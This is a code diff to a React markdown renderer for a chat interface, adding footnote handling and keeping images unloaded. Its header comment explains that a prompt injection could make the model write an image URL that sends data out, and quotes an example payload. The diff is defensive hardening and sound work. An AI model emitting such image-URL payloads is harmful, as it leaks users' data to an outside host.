@@ -10,9 +10,11 @@
 // plain text with no lazy highlighter. No image ever loads: an image URL the
 // model writes would be fetched on render, which a prompt injection can use
 // to send data out (`![](https://x/?d=<notes>)`), so a web image becomes a
-// link the viewer must click. A page citation becomes a chip.
+// link the viewer must click, or only its text inside a link (an anchor never
+// nests in an anchor). Only a web link opens in a new tab; a footnote jumps
+// within the reply. A page citation becomes a chip.
 
-import { memo, useMemo, type ReactNode } from 'react';
+import { createContext, memo, useContext, useMemo, type ReactNode } from 'react';
 import { defaultRehypePlugins, defaultRemarkPlugins, Streamdown, type StreamdownProps } from 'streamdown';
 import { renderCitationChip } from '../citation-chip/citation-chip.render';
 import { citationHref, citationMarkdown, citedPageId } from '../chat-text/chat-text';
@@ -39,10 +41,33 @@ const remarkPlugins: StreamdownProps['remarkPlugins'] = [
   remarkHtmlAsText,
 ];
 
+type Pluggable = NonNullable<StreamdownProps['rehypePlugins']>[number];
+
+/** Streamdown's harden step, marking what it blocks in imago's tokens instead of its stock grey classes. */
+const hardenInTokens = (pluggable: Pluggable | undefined): Pluggable | undefined => {
+  if (!Array.isArray(pluggable)) return pluggable;
+  const [plugin, options] = pluggable;
+  return [plugin, { ...(options as object), blockedImageClass: proseClasses.blockedImage, blockedLinkClass: proseClasses.blockedLink }];
+};
+
 // Without rehype-raw (no HTML is parsed) and katex (no math styles here).
-const rehypePlugins: StreamdownProps['rehypePlugins'] = [defaultRehypePlugins.sanitize, defaultRehypePlugins.harden].filter(
-  (plugin) => plugin !== undefined,
-);
+const rehypePlugins: StreamdownProps['rehypePlugins'] = [
+  defaultRehypePlugins.sanitize,
+  hardenInTokens(defaultRehypePlugins.harden),
+].filter((plugin) => plugin !== undefined);
+
+/** Whether an element renders inside a link, where an image may only be text. */
+const InLink = createContext(false);
+
+const isWebUrl = (url: string): boolean => /^https?:\/\//i.test(url);
+
+/**
+ * GFM already prefixes footnote ids with `user-content-`, and sanitising
+ * prefixes them again, while the links keep one prefix: one is dropped so a
+ * footnote jump lands. Every id still carries the prefix, so none can clobber
+ * a page global.
+ */
+const footnoteId = (id: string | undefined): string | undefined => id?.replace(/^user-content-(?=user-content-)/, '');
 
 /** The text of an element as the markdown parser built it (hast). */
 type HastNode = { readonly type?: string; readonly value?: unknown; readonly children?: readonly HastNode[] };
@@ -54,7 +79,21 @@ const hastText = (node: HastNode | undefined): string =>
       ? node.value
       : (node.children ?? []).map((child) => hastText(child)).join('');
 
-type WithNode = { readonly node?: unknown; readonly children?: ReactNode };
+type WithNode = { readonly node?: unknown; readonly children?: ReactNode; readonly id?: string };
+
+type ImageProps = WithNode & { readonly src?: unknown; readonly alt?: unknown };
+
+function ProseImage({ src, alt }: ImageProps) {
+  const inLink = useContext(InLink);
+  const label = typeof alt === 'string' && alt.trim() !== '' ? alt : 'image';
+  return !inLink && typeof src === 'string' && isWebUrl(src) ? (
+    <a href={src} target="_blank" rel="noopener noreferrer" className={proseClasses.a}>
+      {label}
+    </a>
+  ) : (
+    <span>{label}</span>
+  );
+}
 
 const heading = (Tag: 'h1' | 'h2' | 'h3' | 'h4' | 'h5' | 'h6') =>
   function Heading({ children }: WithNode) {
@@ -62,32 +101,29 @@ const heading = (Tag: 'h1' | 'h2' | 'h3' | 'h4' | 'h5' | 'h6') =>
   };
 
 const components = (citationDriveId: string | null): StreamdownProps['components'] => ({
-  a: ({ href, children }: WithNode & { readonly href?: string }) => {
+  a: ({ href, children, id }: WithNode & { readonly href?: string }) => {
+    const label = <InLink.Provider value>{children}</InLink.Provider>;
     const pageId = citedPageId(href);
     if (pageId !== null) {
       return renderCitationChip({
-        label: children,
+        label,
         href: citationDriveId === null ? null : citationHref(citationDriveId, pageId),
       });
     }
     // Sanitising drops an unsafe href: what is left is only text.
     if (href === undefined || href === '') return <span>{children}</span>;
-    return (
+    // A footnote and its back link jump within the reply; only the web opens a new tab.
+    return isWebUrl(href) ? (
       <a href={href} target="_blank" rel="noopener noreferrer" className={proseClasses.a}>
-        {children}
-      </a>
-    );
-  },
-  img: ({ src, alt }: WithNode & { readonly src?: unknown; readonly alt?: unknown }) => {
-    const label = typeof alt === 'string' && alt.trim() !== '' ? alt : 'image';
-    return typeof src === 'string' && /^https?:\/\//i.test(src) ? (
-      <a href={src} target="_blank" rel="noopener noreferrer" className={proseClasses.a}>
         {label}
       </a>
     ) : (
-      <span>{label}</span>
+      <a href={href} id={footnoteId(id)} className={proseClasses.a}>
+        {label}
+      </a>
     );
   },
+  img: ProseImage,
   strong: ({ children }: WithNode) => <strong className={proseClasses.strong}>{children}</strong>,
   h1: heading('h1'),
   h2: heading('h2'),
@@ -97,7 +133,8 @@ const components = (citationDriveId: string | null): StreamdownProps['components
   h6: heading('h6'),
   ul: ({ children }: WithNode) => <ul className={proseClasses.ul}>{children}</ul>,
   ol: ({ children }: WithNode) => <ol className={proseClasses.ol}>{children}</ol>,
-  li: ({ children }: WithNode) => <li>{children}</li>,
+  // A footnote's id is where its reference jumps to.
+  li: ({ children, id }: WithNode) => <li id={footnoteId(id)}>{children}</li>,
   blockquote: ({ children }: WithNode) => <blockquote className={proseClasses.blockquote}>{children}</blockquote>,
   code: ({ children }: WithNode) => <code className={proseClasses.code}>{children}</code>,
   // A fenced block: its text, as text. Streamdown's own block lazy-loads a highlighter.
